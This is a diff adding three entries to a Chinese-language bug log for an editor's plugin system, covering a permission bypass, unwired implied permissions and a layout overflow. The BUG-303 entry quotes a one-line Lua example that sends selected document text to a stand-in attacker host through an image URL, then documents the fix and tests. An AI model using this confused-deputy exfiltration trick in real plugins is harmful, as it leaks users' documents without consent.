@@ -45,6 +45,9 @@
 | BUG-300 | 2026-09-07 | AI 写作的六个建议在每种语言里都是英文 | P2 | 已修复 |
 | BUG-301 | 2026-09-07 | 悬浮卡片只能在文档那一格里拖动 | P2 | 已修复 |
 | BUG-302 | 2026-09-07 | 右侧边栏抽屉里的插件问不了问题，也就没法用 | P1 | 已修复 |
+| BUG-303 | 2026-09-07 | 插件不申请 `network.request` 也能让宿主替它发出站请求 | P0 | 已修复 |
+| BUG-304 | 2026-09-07 | `PluginPermission.withImplied` 写好了没人调，`ui.webview` 不带网络 | P1 | 已修复 |
+| BUG-305 | 2026-09-07 | 权限清单里长句子横向溢出，最该读的那条读不到 | P1 | 已修复 |
 
 ---
 
@@ -2220,3 +2223,132 @@ typedef PluginTextSink = void Function(String text, {bool append});
 ### 涉及文件
 
 `lib/ui/widgets/plugin_command_actions.dart`；`lib/ui/widgets/right_side_bar.dart`；`test/ui/widgets/right_sidebar_test.dart`
+
+---
+
+## BUG-303：插件不申请 `network.request` 也能让宿主替它发出站请求
+
+### 现象
+
+一个只声明了 `document.read` 的插件——读者最可能放行的那种组合，"能看我的文档，
+但联不了网"——可以在自绘界面里放一个 image 节点：
+
+```lua
+sdk.ui.image("https://attacker.example/p.png?d=" .. selected_text)
+```
+
+宿主会老老实实把它取回来。文档内容跟着查询串一起出去了。
+
+### 根因
+
+`PluginImageLoader` 的类注释写着：
+
+> A plugin may reach the network — that is what `network.request` grants
+
+**但 `load()` 从来没有检查过这个权限**，这个类连插件的权限列表都拿不到。
+构造点 `plugin_command_actions.dart` 也只传了目录和日志。
+
+这是典型的 confused deputy：宿主有网络能力，插件只要能指定一个 URL，
+就借到了这个能力。行为级的闸门（`plugin_command_service._guard`）拦的是**动作类型**
+——`PluginUiAction` 要 `ui.sidebar`——而不是动作**内容**里的那个地址。
+
+写下这段注释的时候我大概真的以为它成立。"A permission the reader cannot afterwards
+check up on is a promise" 这句话就在调用点上方，而权限本身没有被读过一次。
+
+### 修
+
+`PluginImageLoader` 增加 `required bool allowNetwork`。**required 而不是给默认值**：
+两个默认值都是错的——`true` 把网络给了没申请的插件，`false` 从申请了的插件手里拿走。
+让每个构造点自己回答。
+
+拒绝发生在**请求之前**，不是之后：URL 本身就是一条消息，先发出去再抛异常，
+等于已经把要保护的东西交出去了。测试为此专门断言"服务器根本没被访问"，
+而不只是断言抛了异常。
+
+拒绝也写进插件日志。插件伸手去够一个它没有的权限，正是读者留着这份日志要查的事。
+
+### 变异
+
+拿掉 `if (!allowNetwork)` 整块：两条新测试失败——一条说"期望抛出，实际拿到了
+[1,2,3]"，一条说日志里没有 refused。把调用点改成写死 `allowNetwork: true`：
+新守卫 `plugin_network_is_gated_test` 失败。
+
+### 一条守卫，不只是一次修复
+
+`plugin_network_is_gated_test` 扫 `lib/` 里所有 `PluginImageLoader(` 的构造点，
+要求每个都传了 `allowNetwork` **且它来自 `hasPermission`**。写死 `true` 会通过
+其余全部测试——这一类错误只有守卫拦得住。
+
+守卫自己也有两个坑，都踩了：构造函数的**声明**也匹配 `PluginImageLoader\(`
+（用 `required this.` 排除），以及扫不到任何构造点时会静默通过（加 `isNotEmpty`）。
+
+### 涉及文件
+
+`lib/services/plugin_image_loader.dart`；`lib/ui/widgets/plugin_command_actions.dart`；
+`test/services/plugin_image_loader_test.dart`；`test/services/plugin_network_is_gated_test.dart`
+
+---
+
+## BUG-304：`PluginPermission.withImplied` 写好了没人调
+
+### 现象
+
+manifest 里 `ui.webview` 的注释说得很清楚：
+
+> Carries [networkRequest] with it, and the reader is told so
+
+`implied` 表存在，`withImplied()` 实现正确。**`lib/` 和 `test/` 里都没有第二处引用。**
+`hasPermission` 读的是原始 `permissions` 列表，安装对话框显示的也是原始列表。
+所以声明了 `ui.webview` 的插件，`hasPermission('network.request')` 答 false，
+读者看到的清单里也没有那一行。
+
+这是本仓库第六次出现「写好了却没接上」。前五例记在 `written-but-never-wired-up`。
+
+### 修
+
+两处，都是一行：`hasPermission` 经 `withImplied` 读；详情页的清单也经它。
+
+两处都要改，缺一处就是另一种谎：只改 `hasPermission`，读者看到的清单比实际授予的少
+（注释自己说这"比不给清单更糟"）；只改显示，清单说给了而检查说没给。
+
+### 涉及文件
+
+`lib/services/plugin_manifest.dart`；`lib/ui/screens/plugin_detail_view.dart`；
+`test/services/plugin_manifest_test.dart`；`test/ui/screens/plugin_permissions_test.dart`
+
+---
+
+## BUG-305：权限清单里长句子横向溢出
+
+### 现象
+
+写 BUG-304 的展示测试时撞出来的，不是找出来的：`RenderFlex overflowed by 378 pixels
+on the right`。`ui.webview` 的说明是"Open its own web page inside the editor,
+which can reach any server (the editor logs where)"，88 个字符。
+
+**最长的句子挂在最宽的权限上**——最需要读到它的读者，恰好是读不到的那个。
+
+### 根因
+
+`Wrap` 只在**子项之间**换行，从不在子项**内部**换行。每一条权限是一个
+`mainAxisSize: min` 的 `Row`，里面的 `Text` 没有任何宽度约束，于是整行冲出面板。
+
+短句子看起来一切正常，所以这个布局从写下那天起就一直在等一条足够长的说明。
+
+### 修
+
+改成一行一条，`Text` 放进 `Expanded` 里自然折行；对勾用 `crossAxisAlignment.start`
+加 2px 上边距，与两行句子的第一行对齐。
+
+权限清单本来就是要被逐条读的东西，一行一条也更接近应用商店的惯例。挤两条半句在一行、
+第三条冲出屏幕，并不比一行一条更好读。
+
+### 变异
+
+把布局改回 `Wrap`：「a permission another one carries is shown too」和
+「a long sentence wraps rather than running off the edge」两条同时失败。
+后者把窗口设成 360×640——面板是可以拖窄的，而 768 下只有 webview 那条会溢出。
+
+### 涉及文件
+
+`lib/ui/screens/plugin_detail_view.dart`；`test/ui/screens/plugin_permissions_test.dart`
